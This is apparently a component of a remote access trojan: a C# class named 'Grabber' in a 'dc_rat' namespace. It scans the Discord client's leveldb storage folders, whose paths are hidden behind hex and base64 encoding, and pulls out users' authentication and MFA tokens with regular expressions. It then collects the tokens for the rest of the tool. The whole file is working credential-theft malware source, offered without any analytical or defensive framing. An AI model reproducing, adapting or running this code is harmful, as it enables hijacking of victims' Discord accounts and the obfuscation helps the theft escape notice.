using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;
namespace dc_rat
{
    public static class Grabber
    {
        internal static void Grab()
        {
            GetThem();
        }

        private static void GetThem()
        {
            List<string> discordTokens = new List<string>();
            DirectoryInfo[] rootFolders =
            {
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "584546776345526864474663556d396862576c755a31786b61584e6a62334a6b584578765932467349464e3062334a685a325663624756325a57786b59673d3d".FromHex().FromBase64()),
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "584546776345526864474663556d396862576c755a31786b61584e6a62334a6b63485269584578765932467349464e3062334a685a325663624756325a57786b59673d3d".FromHex().FromBase64()),
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "584546776345526864474663556d396862576c755a31786b61584e6a62334a6b5932467559584a35584578765932467349464e3062334a685a325663624756325a57786b59673d3d".FromHex().FromBase64()),
                new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "584546776345526864474663556d396862576c755a31786b61584e6a62334a6b5a4756325a5778766347316c626e52635447396a5957776755335276636d466e5a5678735a585a6c62475269".FromHex().FromBase64())
            };

            foreach (var rootFolder in rootFolders)
            {
                try
                {
                    foreach (var file in rootFolder.GetFiles("*.ldb"))
                    {
                        string readFile = file.OpenText().ReadToEnd();

                        foreach (Match match in Regex.Matches(readFile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                            discordTokens.Add(match.Value + "\n");

                        foreach (Match match in Regex.Matches(readFile, @"mfa\.[\w-]{84}"))
                            discordTokens.Add(match.Value + "\n");
                    }
                }
                catch { }
            }


            discordTokens = discordTokens.Distinct().ToList();

            foreach (var token in discordTokens)
            {
                Program.dcTokens += $"\n{token}";
            }
        }

        private static string FromBase64(this string base64)
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(base64));
        }

        private static string FromHex(this string hex)
        {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++) bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return Encoding.UTF8.GetString(bytes);
        }
    }
}